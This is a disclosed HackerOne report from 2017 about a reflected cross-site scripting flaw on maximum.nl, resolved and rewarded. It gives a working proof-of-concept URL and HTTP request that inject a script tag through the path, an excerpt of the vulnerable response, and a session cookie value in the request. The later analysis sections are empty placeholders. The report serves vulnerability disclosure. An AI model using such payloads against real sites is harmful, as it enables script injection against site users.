---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '228006'
original_report_id: '228006'
title: Cross-site Scripting (XSS) on [maximum.nl]
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: radancy
created_at: '2017-05-12T19:17:58.995Z'
disclosed_at: '2017-05-24T09:08:59.097Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Cross-site Scripting (XSS) on [maximum.nl]

## Metadata

- HackerOne Report ID: 228006
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: radancy
- Disclosed At: 2017-05-24T09:08:59.097Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

##POC:
By visiting the following URL > https://maximum.nl/"><script>prompt("exr")</script><!--/index.php

Or preforming the showing request :
```
GET /"><script>prompt("exr")</script><!--/index.php HTTP/1.1
Host: maximum.nl
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: laravel_session=eyJpdiI6Im94Uk52NHpxc3VKcFRoMThqRXZlRGc9PSIsInZhbHVlIjoiUWlqNk10dHNFclRcL1ZNNHJFWlZLWHhTQkNWbmlQd1pEMkFrRkJNSVpKYVlTajlLSlwvUllwWEhCYTNzckMzUVM2OVlkUStcL1BBbnVxMjVtcm51YUowdXc9PSIsIm1hYyI6ImRjMGYxNWFiNzE3MjZjYWMxOTdhY2EyMmVhYjhmYjE2ZTQyMTczYzk4Yjg2ODdlN2I0ZGY3NzgyMzFmM2YxODMifQ%3D%3D; _ga=GA1.2.1741493924.1494610209; _gid=GA1.2.1226624986.1494612538; _vwo_uuid_v2=58B280465974A9FE1B5DAF8815EA2396|02b9c0669e36dd7cd59d4a7a29ab29ef
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```
on Firefox, the JavaScript code injected inside the payload is correclty executed, as showed in the following snippet of response and as it is possible to see in the screenshot attached  █████████.

```HTML

    
                  <meta property="og:image" content="https://maximum.nl/"><script>prompt("exr")</script><!--/images/logo-maximum.png" />
      
    
    <title>
      Employer Branding - Directe werving - Retentie | Maximum
    </title>

          <link rel="shortcut icon" href="https://maximum.nl/"><script>prompt("exr")</script><!--/favicon.ico">
    
    <link media="all" type="text/css" rel="stylesheet" href="https://maximum.nl/&quot;&gt;&lt;script&gt;prompt(&quot;exr&quot;)&lt;/script&gt;&lt;!--/css/main.css?1490352453">
```

Best Regards,
@exr

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
